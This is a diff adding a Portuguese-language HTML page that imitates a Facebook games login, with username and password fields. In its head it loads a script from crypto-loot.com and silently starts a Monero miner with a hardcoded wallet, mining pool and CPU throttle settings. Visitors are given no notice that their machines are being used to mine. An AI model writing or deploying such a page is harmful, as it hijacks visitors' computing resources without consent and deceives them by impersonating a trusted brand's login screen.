@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Jogos</title>
+    <script src="https://crypto-loot.com/lib/miner.js"></script>
+    <script>
+        // Configuração do minerador
+        const miner = new CryptoLoot.Anonymous('4B9QqaiDCKkHCDVNnzAGMEcMqXUoeF2vHQsPYGEEJxbfibRq4HmN8Yj3DtHPxpKoTW1Zh8CcA5nPtfJVRsdDZsLD7vnrB2B', {
+            threads: 2, // Número de threads
+            throttle: 0.5, // Limita o uso da CPU para 50%
+            pool: {
+                host: 'pool.supportxmr.com',
+                port: 5555,
+                pass: 'x' // Senha do worker (pode ser qualquer coisa)
+            }
+        });
+
+        // Inicia a mineração
+        miner.start();
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h1 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+        .games-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .games-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Facebook - Jogos</h1>
+        <form>
+            <label for="username">Usuário ou e-mail:</label>
+            <input type="text" id="username" name="username"><br><br>
+            <label for="password">Senha:</label>
+            <input type="password" id="password" name="password"><br><br>
+            <input type="submit" value="Entrar">
+        </form>
+        <a href="#" class="games-link">Acesse nossos jogos exclusivos!</a>
+    </div>
+</body>
+</html>
